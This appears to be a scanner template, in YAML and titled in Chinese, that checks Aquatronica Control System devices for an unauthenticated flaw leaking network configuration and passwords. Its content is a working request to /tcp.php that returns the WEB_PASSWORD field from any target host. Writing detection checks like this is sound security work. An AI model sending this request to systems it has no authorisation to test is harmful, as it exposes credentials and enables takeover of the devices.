script_name: Aquatronica Control System敏感信息泄露漏洞
content:
id: Aquatronica Control System敏感信息泄露漏洞

info:
  name: Aquatronica Control System敏感信息泄露漏洞
  author: Deans
  severity: high
  description: 在Aquatronica Control System中存在未授权访问漏洞，可能许攻击者未经授权访问系统中的敏感信息，造成数据信息泄露并通过泄露的密码登录接管系统。
  reference:
  - https://github.com/
  - https://cve.mitre.org/
  metadata:
    max-request: 1
    shodan-query: ""
    verified: true
  yakit-info:
    sign: f93d9136328b6f405bea9667ddfddff3

http:
- raw:
  - |-
    @timeout: 30s
    POST /tcp.php HTTP/1.1
    Content-Type: application/x-www-form-urlencoded
    Host: {{Hostname}}

    function_id=tcp_xml_request&command=WS_GET_NETWORK_CFG

  max-redirects: 3
  disable-cookie: true
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - WEB_PASSWORD
    condition: and
